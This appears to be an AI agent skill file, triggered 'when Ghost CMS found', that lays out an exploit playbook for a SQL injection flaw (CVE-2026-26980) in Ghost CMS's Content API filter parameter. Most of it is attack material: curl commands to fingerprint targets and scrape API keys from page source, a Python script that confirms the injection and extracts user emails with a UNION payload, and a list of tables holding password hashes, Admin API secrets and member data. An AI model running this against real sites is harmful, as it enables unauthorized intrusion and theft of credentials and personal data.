---
name: ghost-cms-content-api-sqli
description: "Use when Ghost CMS found. Content API SQLi."
---
# CVE-2026-26980 Ghost CMS Content API SQL Injection

## Overview
Ghost CMS < 5.x (specific patch version TBD). The Content API's filter parameter is vulnerable to SQL injection when processing user-supplied filter expressions. Unauthenticated if Content API key is exposed (common — embedded in theme JS).

## Detection
```bash
# Fingerprint Ghost
curl -sI <TARGET> | grep -i 'x-powered-by: Ghost\|ghost/'
curl -s <TARGET>/ghost/api/content/posts/?key=<API_KEY> | head -c 200
# Content API key often in page source:
curl -s <TARGET> | grep -oP 'key=[a-f0-9]{26}'
```

## Exploitation
```python
import requests

TARGET = '<TARGET>'
API_KEY = '<CONTENT_API_KEY>'  # From page source or /ghost/api/content/

# Boolean-based: filter parameter injection
# Normal request
r1 = requests.get(f'{TARGET}/ghost/api/content/posts/',
    params={'key': API_KEY, 'filter': "slug:'test'"})

# SQLi test — always true
r2 = requests.get(f'{TARGET}/ghost/api/content/posts/',
    params={'key': API_KEY, 'filter': "slug:'test' OR 1=1--"})

# If r2 returns more results than r1 = SQLi confirmed

# Extract data (UNION-based if MySQL):
payload = "slug:'x' UNION SELECT 1,email,3,4,5,6,7,8,9,10 FROM users--"
r3 = requests.get(f'{TARGET}/ghost/api/content/posts/',
    params={'key': API_KEY, 'filter': payload})
print(r3.json())
```

## Key tables (Ghost/MySQL)
- `users` — email, password, name, slug, status
- `api_keys` — secret (Admin API keys)
- `settings` — key/value (mail config, integrations)
- `members` — email, name, subscriptions

## Pitfalls
- Content API key required (but usually public in page source)
- Filter syntax is Ghost-specific (NQL) — injection point is within NQL parser
- SQLite vs MySQL backend — syntax differs
- Source: EQSTLab/CVE-2026-26980